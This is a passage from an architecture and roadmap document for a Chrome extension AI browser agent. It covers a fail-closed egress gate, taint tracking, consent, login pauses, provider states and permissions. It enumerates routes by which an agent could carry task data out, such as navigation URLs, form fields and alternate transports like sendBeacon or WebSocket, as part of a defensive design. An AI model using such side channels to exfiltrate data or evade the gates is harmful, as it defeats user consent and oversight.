| form field = `<task-derived>`                   | **consent-required egress** | full gate incl. consent          |
| Destination on the blocked list / non-navigable | **prohibited**              | denied before carrier assessment |

A navigation emits a network request in every row. Only the rows where the URL
can _carry_ task-derived data are data egress. Treating every request as an
exfiltration would make the gate unusable and train users to click through it,
which is itself a security failure.

**Provider transport — negative tests required.** Beyond the conformance test:

| Test                     | Expectation                                                                                                                                            |
| ------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------ |
| Throwing fetch           | adapter surfaces the error; **no** network call by another route                                                                                       |
| Alternate transport      | an adapter reaching for `XMLHttpRequest`, `WebSocket`, `EventSource` or `sendBeacon` is **rejected at registration**, and the attempt fails at runtime |
| Streaming                | SSE flows through the guarded transport                                                                                                                |
| Retry                    | each retry re-enters the gate; a retry is not pre-authorized                                                                                           |
| Multiple calls           | every call evaluated; one grant does not cover a loop                                                                                                  |
| Registration conformance | every registered factory produces an adapter that performs no network call when handed a throwing fetch                                                |

Rejection is a registration-time check in the existing `ProviderRegistry`
(`provider-registry.ts:35`) `VERIFIED IN CODE` — no plugin framework is added.

**UNKNOWN fails closed everywhere.** Enumerated so no path is left to
interpretation:

| Path                       | On UNKNOWN                                              |
| -------------------------- | ------------------------------------------------------- |
| Provider request           | **DENY**                                                |
| Browser navigation         | **DENY**                                                |
| Form submission            | **DENY**                                                |
| Click activation           | **DENY**                                                |
| Consent evaluation         | **DENY** — never an implicit grant                      |
| Persistence recovery       | **PAUSE**                                               |
| Malformed task             | **DENY** + PAUSE                                        |
| Missing task               | **FAIL** the task                                       |
| Missing destination        | **DENY**                                                |
| Missing provenance         | **DENY**                                                |
| Missing / corrupt taskSalt | new salt, new epoch, continue — **never** plain SHA-256 |
| Missing security context   | **DENY**                                                |

`UNKNOWN` may never become `KNOWN_UNTAINTED`, `TAINTED([])`, an allow, or an
implicit consent. `TAINTED([])` is not a representable state: an empty source
list is `KNOWN_UNTAINTED`, and only the trusted construction points produce it.

### C-12. Final implementation order

| Step | Output                                    | Prerequisite | Tests                 | Invariant established      |
| ---- | ----------------------------------------- | ------------ | --------------------- | -------------------------- |
| 1    | `taintState` persisted via mutator        | none         | unit + eviction E2E   | security state survives    |
| 2    | Provenance/trust split; Web UI pinned     | 1            | unit                  | no laundering              |
| 3    | Structured destination + canonicalization | 2            | unit                  | destination identity       |
| 4    | `EGRESS_DECISION` evidence, salted hash   | 3            | unit                  | decisions observable       |
| 5    | `authorizeEgress` gate, fail-closed       | 1-4          | unit, A-F             | unknown denies             |
| 6    | Guarded provider fetch via factory        | 5            | real Chromium, test P | no privileged side channel |
| 7    | Consent key + revocation                  | 5            | unit, cases 1-12      | consent specificity        |
| 8    | Carrier assessment on browser actions     | 5            | real Chromium 1-15    | browser actions gated      |
| 9    | Lint rule + runtime interceptor           | 6            | tests A, B            | closes D-EG-5 (weakness)   |
| 10   | Full adversarial + real-Chromium suites   | 1-9          | all                   | exit gate                  |

Change from §4J: carrier assessment is separated into its own step (8). It was
implicit in the evaluator step and is large enough to fail on its own.

---

## 5. Authentication / Human-in-the-Loop Model

The intended flow, which is compatible with the credential boundary:

```text
agent needs the web provider
  → opens/locates the provider tab
  → observes: authenticated, or authentication required
  → if required: task PAUSES, user is told which provider needs a login
  → user authenticates themselves, by whatever method the provider requires
  → agent observes the authenticated state
  → task resumes
```

The extension never handles the credential. It must not request a provider
password, a Google/Microsoft/Apple password, or an MFA code; must not read
browser password stores, cookies, session tokens or OAuth tokens; and must not
attempt to bypass MFA, CAPTCHA, OAuth consent or SSO. Where a browser or site
control prevents an action, that is a technical limitation to be documented,
never something to work around (§3.3, and the prohibitions restated in the
Stage 3 brief).

`AgentTask` already has `WAITING_FOR_PERMISSION` and `PAUSED` states and the
runtime already parks interrupted tasks, so the pause/resume shape exists.
What does not exist is a _provider-authentication_ wait reason distinct from a
tool-permission wait, and the UI to explain it.

---

## 6. Provider Registry and Provider State Model

### 6.1 Registry

`ProviderRegistry` today holds `ProviderFactory` → `AIProviderAdapter`, one
active provider id, and singleton adapter instances. Extending it to two
provider kinds is additive: a `kind: 'api' | 'web'` discriminator on the
factory, with `WebProviderAdapter` satisfying the same canonical contract for
generation while declaring a different authentication model. The existing
invariants — no duplicate ids, unknown id throws rather than redirects, a
failed connection does not displace a working provider — apply unchanged and
are already covered by `tests/unit/provider-registry.test.ts`.

Per provider the registry would need: identifier, kind, authentication model,
capability model, browser origin, required permissions, session-detection
method, authentication-state, availability, routing, error mapping, evidence
policy, security policy, consent requirement, and switching rules.

### 6.2 State model

Derived from the browser lifecycle and the existing task states rather than
adopted wholesale. Each state below earns its place by being a state the agent
must _behave differently_ in:

| State                     | Why it is required                                                                                                                                        |
| ------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `UNSUPPORTED`             | The provider is known but cannot be driven safely or reliably; the agent must refuse rather than try.                                                     |
| `NOT_CONFIGURED`          | The user has not chosen this provider; nothing may be opened on their behalf.                                                                             |
| `UNKNOWN`                 | Configured, but no observation has been made yet. Distinct from "not authenticated" — the agent must not report a login is needed when it has not looked. |
| `AUTHENTICATION_REQUIRED` | Observed and a login is needed. This is the state that pauses a task and prompts the user.                                                                |
| `AUTHENTICATING`          | The user is mid-login. The agent must not act on the tab, and must not time the task out.                                                                 |
| `READY`                   | Observed authenticated and usable.                                                                                                                        |
| `SESSION_EXPIRED`         | Was `READY`, now is not, mid-task. Distinct from `AUTHENTICATION_REQUIRED` because a task is in flight and partial work exists.                           |
| `ACCESS_DENIED`           | Authenticated but not entitled (plan, region, org policy). Retrying the login will not help, so it must not be conflated with expiry.                     |
| `PROVIDER_UNAVAILABLE`    | Reachable-but-erroring or offline. Transient; retry may help.                                                                                             |

`AUTHENTICATED` from the brief's candidate list is folded into `READY`:
authenticated-but-unusable is covered by `ACCESS_DENIED`, and a separate
authenticated state with no distinct behaviour would be untestable.

---

## 7. Provider Discovery and Session Detection

Permitted signals only: the tab's URL/origin, the visible page state through
the existing content script, normal navigation outcomes, and explicit user
selection. Never cookies, storage, or credential inspection.

Detection reliability must be stated per provider and must not be assumed:

| Class                   | Meaning                                                                                        |
| ----------------------- | ---------------------------------------------------------------------------------------------- |
| Detectable              | A stable, non-brittle signal distinguishes authenticated from not.                             |
| Partially detectable    | A signal exists but depends on DOM structure or copy that the provider changes without notice. |
| Not reliably detectable | No signal short of attempting the action; the agent must ask the user.                         |

Every AI web application in the brief is a single-page app whose DOM is an
unstable, unversioned, undocumented interface. The realistic default is
**partially detectable**, and the design consequence is that the agent must
degrade to explicit user confirmation rather than guess. A wrong "you are
logged in" is worse than a question.

---

## 8. Provider Switching (P-033)

P-033 stays PARTIAL. Parity requires at least three adapters proving it
(`PARITY_MATRIX.md`, "Before claiming parity"), and §85 F requires the same
workflow to run on OpenAI, Anthropic and Gemini with "different provider
adapter only".

Transitions, with the questions each raises. None is assumed valid:

| Transition | Technically possible | Principal constraints                                                                                                                                                                  |
| ---------- | -------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| API → API  | Yes                  | Capability differences (tool calling, vision, streaming) must be re-negotiated by the doctor, not assumed. Context transfer is a format translation the canonical types already imply. |
| API → Web  | Requires Q1/Q2       | Requires an authenticated tab; the user must authenticate; capability set is whatever the UI exposes; streaming and tool calling almost certainly absent.                              |
| Web → Web  | Requires Q1/Q2       | Two different unstable DOMs; no reason to assume context transfers.                                                                                                                    |
| Web → API  | Requires Q1/Q2       | The web conversation is not exportable as canonical messages without scraping it; that is a data-provenance question, not just a format one.                                           |

Any transition that changes the capability set must require explicit user
confirmation, because a task planned against tool calling cannot silently
continue on a provider that has none — the existing `CHAT_ONLY` refusal is the
precedent.

---

## 9. ChatGPT Representative E2E

ChatGPT is named in the brief as **one representative** web provider and must
not become an architectural assumption. Any such test is gated on Q1 and Q2.

If cleared, the shape would be: the user is logged in; the agent locates the
tab; detects the authenticated state; performs one safe, visible, read-only
task; captures evidence; completes. And the negative: not logged in; the agent
detects it; pauses; the user logs in manually; the agent resumes.

Constraints that hold regardless: no undocumented or private endpoints, no
cookie or token extraction, no credential entry by the agent, and the test must
be reproducible enough not to become a flaky gate. Because the DOM is
unversioned, such a test is a **monitoring** signal, not a correctness gate,
and must not be allowed to block CI on a provider's unrelated UI change.

---

## 10. Other AI Web Provider Strategy

Per-provider analysis requires real validation and has not been done. The
honest classification for **every** candidate today is:

| Provider               | Classification          | Basis                                                                                                                                                           |
| ---------------------- | ----------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Any AI web application | **Requires validation** | No provider has been tested; none has a documented browser-automation contract; all are SPAs with unstable DOM; each has its own terms governing automated use. |

The dimensions to assess per provider, before any is reclassified: origin and
navigation model, authentication methods including SSO and MFA, login-required
detection, authenticated-state detection, DOM interaction feasibility, SPA
routing behaviour, required permissions, session expiry behaviour, rate limits
and access restrictions, stated automation constraints, and E2E feasibility.

A provider that cannot be driven without violating §6 of the brief or §3.3 of
the specification is recorded as **technically constrained** and is not
implemented. No workaround is proposed for any such case.

---

## 11. Chrome End-User Distribution

Developer Mode is not a distribution model. The extension currently has no
published channel, and this is the gating gap between "works" and "usable by
an ordinary person".

| Channel                                    | Applicability           | Notes                                                                                                |
| ------------------------------------------ | ----------------------- | ---------------------------------------------------------------------------------------------------- |
| Chrome Web Store, public                   | Primary candidate       | Requires a developer account, privacy disclosures, a justification for every permission, and review. |
| Chrome Web Store, unlisted                 | Candidate for beta      | Same review, distribution by link.                                                                   |
| Enterprise managed (policy-forced install) | Only for managed fleets | Not applicable to ordinary users.                                                                    |
| Self-hosted CRX / ZIP                      | Not viable              | Chrome does not offer ordinary users a supported path for this.                                      |

### The `debugger` permission (Q3)

`debugger` is permitted in MV3 and is declared in the manifest today. Five
capabilities depend on it: `browser.screenshot` plus `debugger.console`,
`debugger.network`, `debugger.dom` and `debugger.page_state`.

Two distinct concerns, which should not be conflated:

**Store review.** Chrome Web Store program policy requires the narrowest
permission that implements a feature, and rejects permissions requested but
unused or broader than necessary. `debugger` is genuinely used, so the
question is whether a narrower API could serve the same features. For the four
inspection tools, no narrower extension API exposes console, network or the
CDP DOM — the specification says as much (§3 "Chrome offers no lesser API for
this"). For screenshot capture there _is_ a narrower-looking alternative,
`chrome.tabs.captureVisibleTab` — and Stage 2 measured that it requires
`<all_urls>`, which was shown to grant local file read. So the narrower
permission for that one feature is the more dangerous one. That trade is worth
stating plainly in the store justification rather than hiding.

**Enterprise policy, which is a product limitation regardless of review.**
From Chrome 155, on managed browsers `chrome.debugger.attach()` is rejected
outright when an administrator has configured `runtime_blocked_hosts`
(error: _"Host access is restricted by policy"_), and fails when
`DisableScreenshots` or DLP rules apply to the target (_"Screenshot capture is
restricted by policy"_). Unmanaged browsers are unaffected.

This is not speculative: it means all five debugger-dependent capabilities can
fail on managed devices for reasons the extension cannot influence. It belongs
in the §99 platform-limitation table — reference capability, project
capability, limitation, impact, workaround, acceptance status — and the tools
must surface the policy error as a clear refusal rather than a generic failure.

**Not established:** whether a listing declaring `debugger` would be approved.
Review outcomes cannot be predicted and are not assumed here. Current program
policies must be read directly at submission time; the above is drawn from
Chrome developer documentation reached through search, not from a verbatim
reading of the policy pages, which this environment's egress proxy blocked.

**Separate production and diagnostic builds** are worth evaluating: a
production build without `debugger` (losing the four inspection tools, keeping
screenshots only if an acceptable capture path exists) and a diagnostic build
retaining it. This is a product decision with a real capability cost and is
question Q3 for the owner.

---

## 12. Development / Test / Production Environments

|              | Development           | Test / Beta                     | Production               |
| ------------ | --------------------- | ------------------------------- | ------------------------ |
| Build        | unpacked, local       | packaged                        | packaged, versioned      |
| Distribution | load unpacked         | controlled (unlisted)           | supported Chrome channel |
| Providers    | mock provider         | test accounts, test credentials | user's own               |
| Logging      | debug instrumentation | reduced                         | production policy        |
| E2E          | local real Chromium   | packaged build                  | release verification     |

Credentials and configuration must not cross environments. The repository
holds none today and must continue to hold none.

---

## 13. MV3 Manifest and Permission Strategy

Current state, which is the Stage 2 outcome and must be preserved:

| Permission                    | Purpose                                    | Narrower alternative | Notes                                       |
| ----------------------------- | ------------------------------------------ | -------------------- | ------------------------------------------- |
| `sidePanel`                   | primary UI                                 | none                 | required                                    |
| `storage`, `unlimitedStorage` | task/session/evidence persistence          | none                 | evidence exceeds default quota              |
| `tabs`, `tabGroups`           | tab read, grouping                         | drop grouping tools  | `tabGroups` is droppable at a feature cost  |
| `scripting`                   | inject into pre-existing tabs              | none                 | required                                    |
| `debugger`                    | inspection tools and screenshot capture    | drop those tools     | **highest review risk**                     |
| `notifications`               | approval prompts while the panel is closed | none                 | silent stalls otherwise                     |
| `activeTab`                   | act on the current tab                     | none                 |                                             |
| `alarms`                      | wake the worker when a schedule is due     | drop scheduled tasks | added by P-020; one alarm for all schedules |
| `host_permissions`            | `http://*/*`, `https://*/*`                | —                    | **`<all_urls>` must not return**            |
| optional: `downloads`         | file download, requested on use            | —                    | not granted                                 |

`<all_urls>` was removed in Stage 2 after it was measured to grant local file
read; three independent checks now block its return. **It must not be
reintroduced to support web providers** — AI web applications are `https`
origins and are already inside the current grant.

Permissions a future wave might raise, each requiring the same analysis before
it is added: `webNavigation` (SPA routing detection — but its reach is broad
and the existing navigation signals should be exhausted first), `cookies`
(**never**, for the reasons in §6 of the brief), `identity` (only if an
official OAuth flow is adopted for an API provider), `externally_connectable`
(currently absent; adding it opens an inbound surface and needs a threat model
of its own).

---

## 14. Browser Capability Roadmap

| Capability                          | Status                | Principal dependency                                                        |
| ----------------------------------- | --------------------- | --------------------------------------------------------------------------- |
| P-006 advanced forms                | PARTIAL               | none — incremental on the existing interaction engine                       |
| P-009/010/011 upload, download      | NOT-STARTED           | `downloads` permission; file-origin policy; evidence rules for file content |
| Popup / iframe / SPA handling       | partial, undocumented | needed by web providers; frame boundaries and origin checks per frame       |
| Evidence, persistence, cancellation | PASS                  | already validated; extension work only                                      |

Upload and download are the capabilities most likely to interact badly with
the credential boundary and with redaction, and each needs its own security
review rather than being treated as ordinary browser features.

---

## 15. Connectors / Skills / Workflow / Scheduling

**Connectors (Phase 6) are implemented.** `src/connectors/` holds the OAuth
layer, the session lifecycle, the guarded transport, the duplicate-write
guard and one adapter (GitHub). The common prerequisites that made this
cluster are now built: an OAuth credential store distinct from provider
credentials, per-connector scope and least-privilege enforcement, write
consent, connector evidence, and §88 acceptance per connector. See
`docs/connectors.md`.

The one thing outstanding is external rather than architectural: this project
registers no OAuth application, so no live authorization has been performed.
The framework is exercised against a local mock authorization server and API
over real HTTP, and the extension refuses to start a flow it cannot finish.

**Skills (Phase 7) are implemented.** `src/skills/` holds the definition
model and validator, the trusted registry, the step runner over
`ToolRegistry`, and run persistence; `src/tools/skills/` exposes `skills.list`
and `skills.run` into the one tool registry. Three read-only workflows ship.
See `docs/skills.md`.

A skill is structured data with no scripting engine, and it is not a second
execution path: every step dispatches through the same gate a model-proposed
tool call does, so running a workflow costs an approval for the run plus
whatever its steps would have cost alone. Only definitions that shipped in the
build register — there is no installer, and no message that can add one.

**Workflow recording (Phase 8, P-022) is implemented and PARTIAL.**
`src/workflows/` holds the recorder, the parameteriser, the store and the
replayer. The security invariant fixed in advance held: a recorded workflow
goes through the existing validator, the existing registered tools and
`ToolRegistry.dispatch`, and P-022 introduced no second execution engine and
no execution code at all. A recording earns no trust from having been
performed, and replay is a fresh run that re-enters every gate. A recording is
also deliberately not registered — it never reaches `skills.list` and is never
model-selectable, so replay is an explicit user action. See
`docs/workflows.md`.

Element interactions are recorded as §49 asks. A click stores a role and an
accessible name rather than a handle or a selector, built from a six-scalar
descriptor the acting tool reports for the node it had already resolved — no
new permission, no `Runtime.evaluate`, no selector engine, no second query.
That data is tagged `PAGE_DERIVED` and `ELEMENT_BINDING` permanently: semantic
validity gates whether it may be stored, and never changes where it came from.
It may only be compared for equality against a fresh page read or shown in the
review surface.

It remains PARTIAL for reach rather than architecture: the §85 A–F manual
acceptance scenarios have not been run, as for every other capability, and the
multi-connector reference workflow of §44 cannot be recorded because those
connectors do not exist.

**Shortcuts (Phase 8, P-021) are implemented and PARTIAL.** `src/shortcuts/`
holds the shortcut model, name normalisation and the store; the resolver reads
targets through the stores that own them, and `src/background/skill-launcher.ts`
gives a bundled skill a user-initiated route alongside the `skills.run` tool a
model uses. A shortcut holds a name and a reference and adds no execution
path: resolving is a read, and what it names runs through `workflow.replay` or
`skill.run` with every gate re-applied. Collisions and confusable names are
refused rather than merged, and targets are re-checked at every resolution.
See `docs/shortcuts.md`.

**The unified audit trail (P-038) is implemented and PARTIAL.** Tool
executions reach the trail through the single observation hook on
`ToolRegistry.dispatch`, joining the decision events that were already there;
nine declared event types had never been written, which is why the trail could
say what was decided but not what was done. It observes and never authorises,
holds identifiers and decisions rather than data, detects corruption and
reordering through a persisted sequence and a digest chain — not tamper
protection, and not described as such — evicts only with a marker written in
the same transaction, and exports to a local file with no new permission and
no network carrier. See `docs/audit.md`.

It stays PARTIAL because §84 condition 3 is unmet repository-wide, and
because deletion is deliberately not exposed yet.

MCP and plugins remain NOT-STARTED.

Scheduling (P-020) is implemented, and its security prerequisite — the one
that kept it NOT-STARTED — was settled first, as a decision rather than during
implementation. Every control in this architecture terminates in a person who
can answer a prompt, and an unattended run removes them; what a scheduled task
does when it reaches an R2-or-above step was therefore decided explicitly
before any code was written. **It stops.** No pre-authorisation mechanism was
built: there is no saved grant, no per-task "always allow" and no scheduled
authorization token anywhere in the feature. See
`docs/architecture/SCHEDULED_EXECUTION.md`, which also records that the
behaviour at the approval and missed-run boundaries is AI Browser Agent's own
product decision and is **not** a claim about, or an inference from, Claude in
Chrome — for which nothing published settles either question.

P-020 is marked PARTIAL rather than PASS. The implementation is complete and
covered by unit, security and real-Chromium suites, but completeness of
implementation is not behavioural parity with the benchmark, and the same
repository-wide §84 condition that holds every other capability below PASS
holds this one.

Skills (Phase 7) depended on connectors and are now unblocked. Workflow,
recording, shortcuts and scheduling (Phase 8) depend on skills and on
background execution. MCP and plugins (Phase 9) depend on a plugin trust
model that does not exist and is the single largest new security surface in
the remaining plan.

---

## 16. Security Roadmap

No Stage 2 control may be weakened. For each future capability:

| Capability               | New control required                                                                                                                                                                   |
| ------------------------ | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Web providers            | Trust boundary for model output read from a DOM (Q2); provenance rules for DOM-sourced model replies; consent before acting in a user's AI account; account/session association rules. |
| Additional API providers | Per-provider credential isolation; no cross-provider credential reuse; capability negotiation before task start.                                                                       |
| Upload / download        | File-origin policy; redaction over file content; consent for every external side effect.                                                                                               |
| Connectors               | Scope enforcement; write consent; revocation handling; per-connector audit.                                                                                                            |
| MCP / plugins            | Third-party code trust model; sandboxing; permission derivation; supply-chain review.                                                                                                  |
| Scheduling / background  | Consent for unattended execution; bounded autonomy; audit of actions taken while unattended.                                                                                           |

Standing constraints across all of them: no `<all_urls>`; no credential,
cookie or token access; no authentication bypass; prompt-injection, origin,
permission, redaction and cross-task isolation controls remain in force and
gain coverage rather than losing it.

---

## 17. Testing and Evidence Roadmap

Per capability: unit for logic, integration for wiring, security for the
adversarial path, real-Chromium E2E for browser behaviour, and the §85–§89
manual acceptance scenarios for certification.

Authenticated web-app tests carry hard rules: no stored passwords, cookies,
session tokens, OAuth credentials or committed authenticated browser profiles,
and no automated secret entry. Authentication is performed by a human. A
consequence follows directly — **such tests cannot run in unattended CI**, so
they belong in a documented manual acceptance procedure, not in the automated
gate.

Determinism is a standing requirement: the redaction defects were found by
sampled coverage and pinned by deterministic vectors, and both are kept. No
sleep-based endurance tests.

---

## 18. Specification Phase Mapping

| Phase (§96)             | Contents                                                        | State                             |
| ----------------------- | --------------------------------------------------------------- | --------------------------------- |
| 0 Specification         | architecture, threat model, matrix, contracts, test plan        | done                              |
| 1 Chrome shell          | MV3, side panel, worker, tabs, reader, interactions, screenshot | done (Stage 2)                    |
| 2 Agent runtime         | adapter, canonical tools, state machine, context, persistence   | done (Stage 2)                    |
| 3 Deep browser          | debugger, DOM, console, network, visual evidence                | done (Stage 2)                    |
| 4 Security              | permissions, policy, risk, injection, origin, redaction         | done (Stage 2)                    |
| 5 Providers             | OpenAI, Anthropic, Gemini, OpenAI-compatible                    | partial — compatible adapter only |
| 6 Connectors            | Jira, Confluence, Sheets, Figma, GitHub                         | not started                       |
| 7 Skills                | QA, research, debugging                                         | not started                       |
| 8 Workflow              | shortcuts, recording, workflows, scheduler, background          | not started                       |
| 9 MCP / plugins         | MCP, registry, custom connectors, packaged skills               | not started                       |
| 10 Parity certification | run every mandatory parity test                                 | not started                       |

Authenticated web providers and end-user distribution appear in **no** phase.
They are owner-introduced product goals layered onto the specification, which
is itself a reason to record them here rather than in `PARITY_MATRIX.md`.

---

## 19. Remaining Capability Inventory

Status here is kept in step with `PARITY_MATRIX.md`, which is authoritative.
Five rows in this table were once left behind by waves that shipped — P-009,
P-010, P-011, P-023 and P-024 still read NOT-STARTED or INTERFACES-ONLY long
after they were delivered — which made this the wrong place to read "what is
left". They are corrected, and a mismatch between the two is a documentation
bug rather than a difference of opinion.

| ID    | Capability                  | Current Status | Spec Reference                          | Missing Work                                                                           | Dependencies             | External Dependency                    | Security Impact                 | Test Requirements                     |
| ----- | --------------------------- | -------------- | --------------------------------------- | -------------------------------------------------------------------------------------- | ------------------------ | -------------------------------------- | ------------------------------- | ------------------------------------- |
| P-006 | Forms                       | PARTIAL        | §83                                     | complex control coverage                                                               | none                     | none                                   | low                             | unit, integration, E2E                |
| P-009 | Image upload                | PASS           | §83                                     | none                                                                                   | P-010                    | none                                   | file-origin, redaction          | unit, integration, security, E2E      |
| P-010 | File upload                 | PASS           | §83                                     | none                                                                                   | permission review        | none                                   | file-origin, redaction, consent | unit, integration, security, E2E      |
| P-011 | Download                    | PARTIAL        | §83                                     | granted-path E2E needs a real user gesture                                             | `downloads` permission   | none                                   | side-effect consent             | unit, integration, security, E2E      |
| P-020 | Scheduled tasks             | PARTIAL        | §83, Phase 8                            | §84 condition 3 repository-wide; parity with the benchmark undemonstrated              | P-022, background exec   | `alarms`                               | unattended autonomy             | unit, security, E2E                   |
| P-021 | Shortcuts                   | PARTIAL        | §50, §83, Phase 8                       | implementation                                                                         | P-022                    | none                                   | consent, name confusability     | unit, integration, security, E2E      |
| P-022 | Workflow recording          | PARTIAL        | §49, §83, Phase 8                       | §44 multi-connector workflow only                                                      | P-024                    | P-023 connectors                       | replay safety, evidence         | unit, integration, security, E2E      |
| P-023 | Connector framework         | PARTIAL        | §33, §34, §88                           | further connectors; live authorization                                                 | OAuth store, consent     | provider APIs, OAuth apps              | credential isolation, scopes    | unit, integration, security, E2E, §88 |
| P-024 | Skills                      | PARTIAL        | §43, Phase 7                            | multi-connector reference workflow (§44)                                               | P-023                    | connector access                       | inherits connector risk         | unit, integration, security, E2E      |
| P-025 | Plugins                     | NOT-STARTED    | Phase 9                                 | package format; install/review/revoke surfaces                                         | **trust model: drafted** | package authenticity (none obtainable) | third-party code execution      | unit, security, E2E                   |
| P-026 | MCP                         | NOT-STARTED    | Phase 9                                 | client: per-tool approval granularity. server: an inbound channel, which is prohibited | **trust model: drafted** | MCP servers                            | third-party tool surface        | unit, security, E2E                   |
| P-033 | Provider switching          | PARTIAL        | §85 F, §87                              | ≥2 further adapters + shared suite                                                     | Phase 5                  | provider API credentials               | credential isolation            | unit, integration, E2E, §87           |
| P-038 | Audit trail                 | PARTIAL        | §83                                     | query surface narrower than the record; deletion undecided                             | none                     | none                                   | export data exposure            | unit, integration, security, E2E      |
| —     | Authenticated web providers | not in matrix  | no phase; constrained by §3.3, §15, §42 | architecture, trust boundary, per-provider validation                                  | Q1, Q2                   | provider terms and UI stability        | inverted trust model            | manual acceptance only                |
| —     | End-user distribution       | not in matrix  | no phase                                | store listing, privacy docs, permission justification, release process                 | packaged build           | Chrome Web Store review                | permission scrutiny             | release verification                  |

---

## 20. Dependency Graph

```text
Stage 2 baseline (frozen)
    │
    ├── Distribution ──────────────── independent of every product capability
    │
    ├── Phase 5 providers ─────────── prerequisite for P-033 and §85 F / §87
    │
    ├── Browser capability (P-006, P-009/010/011) ── independent of providers
    │
    ├── P-038 audit ───────────────── independent; feeds certification evidence
    │
    ├── Web providers ────────────── BLOCKED on Q1 (policy) and Q2 (trust model)
    │
    └── Phase 6 connectors
            └── Phase 7 skills
                    └── Phase 8 workflow, scheduling
                            └── Phase 9 MCP, plugins
                                    └── Phase 10 certification
                                          requires: all of the above
                                                  + §85–§89 executed
                                                  + §87 per provider
                                                  + §88 per connector
```

---

## 21. Proposed Development Waves

> **Status transition — B2 closed.** B2 was released as `cb98c16` and the gates
> that named it are now satisfied. The rows below record the current gate, not
> the historical one: D4 remains **GATED** on Q1 alone, and F and I are left
> waiting only on their own external inputs. Nothing about parity changed —
> B2 moved no capability row, and the overall product remains PARTIAL. The
> original findings and the defects B2 fixed stay recorded in §4I and §4L
> rather than being edited out of the history.

Classified by dependency, not by preference. Ordering within a wave is not
implied; waves are defined by what must exist first.

| Wave | Classification                      | Contents                                                                                                                                                                                                  | Gate to start                                                              |
| ---- | ----------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------- |
| A    | independent, productization         | Packaged build, release versioning, update path, privacy documentation, permission justification, store submission                                                                                        | none — can start immediately                                               |
| B    | independent, incremental            | P-006 forms; P-038 unified audit and export                                                                                                                                                               | none                                                                       |
| C    | foundational, external-dependency   | Phase 5 providers (Anthropic, Gemini, generic compatible); §87 per provider; then P-033                                                                                                                   | **ADAPTERS COMPLETE** (§4M) — §87 live runs still need project credentials |
| D1   | architectural                       | Web provider **architecture**: registry kind, provider state model, capability declaration, provenance labels                                                                                             | none — buildable today                                                     |
| D2   | security-critical                   | **Authentication state / human-in-the-loop login**: detection from permitted signals, pause, resume                                                                                                       | none — concept B only                                                      |
| D3   | incremental                         | **Web UI interaction**: driving AI websites as ordinary websites                                                                                                                                          | none — concept A, already supported                                        |
| B2   | security-critical, **prerequisite** | **Data egress / exfiltration control closure** (§4I): persist taint, declare destinations, generalise the destination model, pin web output to untrusted, consent as (task, destination), egress evidence | **COMPLETE** — implemented, verified and released (§4L)                    |
| D4   | **GATED**                           | **Web AI inference**: prompt an AI site, read the reply, admit as untrusted data                                                                                                                          | B2 satisfied; still **GATED** on Q1 — terms verified **and** §3.3 decision |
| D5   | **GATED**                           | **Provider-specific enablement**: turning a named provider on in production                                                                                                                               | D4 closed **and** that provider's terms verified individually              |
| E    | dependent, security-critical        | P-009/010/011 upload and download                                                                                                                                                                         | **COMPLETE** (§4N) — no new manifest permission was needed                 |
| F    | dependent, external-dependency      | Phase 6 connectors; §88 per connector                                                                                                                                                                     | B2 satisfied; OAuth apps per connector                                     |
| G    | dependent                           | Phase 7 skills                                                                                                                                                                                            | Wave F                                                                     |
| H    | dependent                           | Phase 8 workflow, recording, shortcuts, scheduling                                                                                                                                                        | Wave G                                                                     |
| I    | architectural, security-critical    | Phase 9 MCP and plugins                                                                                                                                                                                   | B2 satisfied; plugin trust model                                           |
| J    | certification                       | §85–§89 executed and recorded; §99 claim                                                                                                                                                                  | Waves C, F, G, H, I                                                        |

**D1, D2 and D3 are not gated.** The registry shape, the state machine,
authentication detection, pause and resume, the provenance labels, and driving
an AI website as an ordinary website are all permitted and independently
useful. The provenance work in particular strengthens the existing injection
defence whether or not D4 ever ships.

**D4 and D5 are gated and must not be recorded as complete while the gate is
open.** D4 needs the §3.3 owner decision together with verified provider terms.
D5 needs terms verified for each named provider separately — a decision about
one provider says nothing about another.

---

## 22. External Dependencies

| Dependency                                                             | Needed for                                                | Owner action                        |
| ---------------------------------------------------------------------- | --------------------------------------------------------- | ----------------------------------- |
| Chrome Web Store developer account and review                          | Wave A                                                    | register, submit, respond to review |
| Provider API credentials (OpenAI, Anthropic, Gemini)                   | Wave C, §87, live provider E2E                            | obtain project-owned credentials    |
| Per-provider terms review for web automation                           | Wave D                                                    | legal/policy decision (Q1)          |
| Connector OAuth applications (Jira, Confluence, Sheets, Figma, GitHub) | Wave F, §88                                               | register applications               |
| A human operator                                                       | §85–§89 manual acceptance; any authenticated web-app test | schedule                            |

No project-owned provider credentials are configured today, which is why live
provider E2E has never executed.

---

## 23. Risks and Constraints

| Risk                                                          | Nature                  | Mitigation posture                                             |
| ------------------------------------------------------------- | ----------------------- | -------------------------------------------------------------- |
| Web-provider use conflicts with §3.3 / provider terms         | policy                  | Blocked pending Q1; not designed around                        |
| Model output read from a DOM inverts the trust model          | security, architectural | Blocked pending Q2; no implementation first                    |
| AI web app DOMs are unversioned and change without notice     | reliability             | Classify as monitoring, never a CI gate                        |
| `debugger` permission attracts store review scrutiny          | distribution            | Honest justification; dropping the tools is a product decision |
| Authenticated tests cannot run unattended                     | testing                 | Manual acceptance procedure, excluded from the automated gate  |
| Multiple accounts, identities and profiles                    | correctness             | Never infer association; require explicit user selection       |
| Scope creep from "provider-agnostic" to "every AI site works" | product                 | Every provider stays _requires validation_ until tested        |

---

## 23A. Specification Conflict: Options for the Owner

**Verdict: AMBIGUOUS — OWNER DECISION REQUIRED** (§4A). Two options. Neither is
recommended here; the technical consequences differ and the choice is the
owner's.

### Option A — keep §3.3 unchanged; restrict inference to official APIs

Consequences:

- D4 and D5 are closed permanently; D1, D2, D3 still ship, so the product still
  detects providers, handles login, and automates AI websites as sites.
- No terms exposure, no new trust boundary in the inference path, no
  provider-UI fragility in the critical path.
- §87 remains satisfiable, so provider work continues to count toward
  certification.
- The cost is the product goal: a user with only a consumer AI subscription and
  no API key cannot use the agent. That may be a significant share of users.

### Option B — amend §3.3 by explicit, versioned revision

The amendment would have to define, not merely permit: what a Web AI provider
is; its authentication mechanism (observation only, never secret access); its
trust classification (untrusted, per §30); the levels at which its output may
